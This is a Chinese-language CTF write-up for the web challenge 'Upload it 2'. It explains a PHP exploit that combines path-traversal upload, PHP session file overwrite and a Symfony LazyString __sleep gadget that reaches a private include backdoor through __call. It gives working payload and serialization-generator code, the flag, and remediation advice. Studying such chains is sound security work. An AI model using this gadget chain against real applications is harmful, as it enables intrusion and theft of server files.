# Upload it 2

## 题目简述

第二题保留了 `Upload it 1` 的目录穿越上传与 PHP Session 文件写入，但删除了 Opis Closure 依赖，并增加 `sandbox` 类。该类把危险路径藏在私有属性 `$evil` 中，私有方法 `backdoor()` 会 `include_once $this->evil`；作者同时让 `__wakeup` 抛出异常、把 `__destruct` 留空，试图封死常规反序列化入口。

漏洞仍然可以通过 `Symfony\Component\String\LazyString::__sleep` 触发。将 `LazyString::$value` 设置为 `[$sandbox, 'backdoor']`，字符串求值时会尝试调用私有方法；外部作用域不能直接访问它，于是 PHP 转入公开的 `sandbox::__call`。`__call` 在类作用域内确认方法存在并用 `call_user_func_array` 调用，最终进入私有后门并包含攻击者预先上传的 PHP 文件。

## 解题过程

危险类的关键部分为：

```php
class sandbox {
    private $evil;

    public function __wakeup() {
        throw new Error('NO NO NO');
    }

    public function __destruct() {}

    public function __call($func, $value) {
        if (method_exists($this, $func)) {
            call_user_func_array([$this, $func], $value);
        }
    }

    private function backdoor() {
        include_once $this->evil;
    }
}
```

第一步上传待包含文件。使用普通 Session A，令 `path=../..`、文件名为 `a.php`，即可从 `/tmp/sandbox/<hash>` 穿越到 `/tmp/a.php`。内容只需完成文件读取：

```php
<?php echo file_get_contents('/flag');
```

第二步在本地声明仅用于生成序列化数据的同名类。生成类不要实现目标中的 `__wakeup`，否则在本地 `unserialize` 或调试时会提前抛错；私有属性名必须保持为 `evil`，使序列化后的名称修饰与目标类一致：

```php
<?php
namespace Symfony\Component\String {
    class LazyString {
        private $value;
        public function __construct($value) {
            $this->value = $value;
        }
    }
}

namespace {
    class sandbox {
        private $evil;
        public function __construct() {
            $this->evil = '/tmp/a.php';
        }
    }

    $box = new sandbox();
    $lazy = new \Symfony\Component\String\LazyString([$box, 'backdoor']);
    echo 'pwn|' . serialize($lazy);
}
```

与第一题相同，选择另一个未使用的 Session B，把生成结果作为文件内容，以 `path=../..` 和文件名 `sess_<B>` 上传到 `/tmp/sess_<B>`，随后携带 `PHPSESSID=<B>` 访问应用。

在目标版本中，`session_start()` 已注册请求关闭时的 Session 保存流程。解码嵌套对象时，`sandbox::__wakeup` 虽然抛出异常，但已经恢复的 Session 对象会在关闭阶段进入编码流程；序列化外层 `LazyString` 调用 `__sleep`，其实现会先调用 `__toString`，从而执行保存在 `$value` 中的 callable：

```text
LazyString::__sleep
  -> LazyString::__toString
  -> [$sandbox, "backdoor"]()
  -> sandbox::__call("backdoor", [])
  -> sandbox::backdoor()
  -> include_once "/tmp/a.php"
```

最终输出：

```text
SCTF{Wow_sl3ep_ch@in_1s_so_c0o0O0ooo0ooOool}
```

## 方法总结

本题说明“私有方法”和“抛异常的 `__wakeup`”都不是完整的反序列化防线。`__call` 自身位于类作用域，它把外部不可访问的方法重新暴露为可调用入口；Session 的关闭阶段又提供了独立于正常业务流程的第二次对象序列化时机。

修复应首先消除目录穿越和 Session 文件覆盖能力，再移除这种通用的 `__call` 转发器。危险包含路径不应保存在可反序列化对象的可控属性中；同时应避免在 Session 内保存第三方可延迟执行的对象，并把异常路径也纳入请求关闭和持久化逻辑的安全审计。
